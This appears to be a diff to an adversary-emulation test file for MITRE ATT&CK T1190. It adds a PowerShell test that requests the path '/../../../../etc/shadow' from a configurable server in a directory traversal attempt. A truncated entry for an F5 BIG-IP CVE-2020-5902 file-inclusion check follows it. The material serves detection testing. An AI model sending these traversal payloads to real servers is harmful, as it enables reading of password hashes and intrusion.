@@ -1,6 +1,38 @@
 attack_technique: T1190
 display_name: Exploit Public-Facing Application
 atomic_tests:
+-   -   name: Generic Web Directory Traversal Attempt
+        description: |
+            Uses PowerShell to initiate a Directory Traversal (Path Traversal) attempt against a vulnerable server.
+            Upon successful exploitation, the server's /etc/shadow file should be returned. To be successful, this attack must be performed against a vulnerable server (using improper URI validation or sanitization), otherwise it will fail.
+        supported_platforms:
+        -   windows
+        -   linux
+        input_arguments:
+            target_server:
+                default: 127.0.0.1
+                description: Vulnerable server hostname or IP
+                type: string
+            target_server_port:
+                default: 443
+                description: Vulnerable server port
+                type: integer
+            user_agent:
+                default: (Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
+                    like Gecko) Chrome/44.0.2403.157 Safari/537.36)
+                description: User Agent to be used
+                type: string
+            vulnerable_uri:
+                default: /../../../../etc/shadow
+                description: Common URI structure associated with /etc/shadow directory
+                    traversal attempts.
+                type: string
+        executor:
+            command: |
+                Write-Host "Configured to connect to vulnerable server: #{target_server}:#{target_server_port}"
+                Invoke-WebRequest -Uri 'https://#{target_server}:#{target_server_port}/#{vulnerable_uri}' -UserAgent '#{user_agent}'
+            elevation_required: false
+            name: powershell
 -   name: F5 BIG-IP TMUI LFI and RCE Vulnerability - CVE-2020-5902
     description: |
         Attempts to check for CVE-2020-5902, a vulnerability in F5 BigIP devices allowing Local File Inclusion and Remove Code Execution conditions. Executes Powershell.exe with instructions to perform a Local File Inclusion (LFI) attack against a vulnerable Big-IP server to read the servers configuration file. 
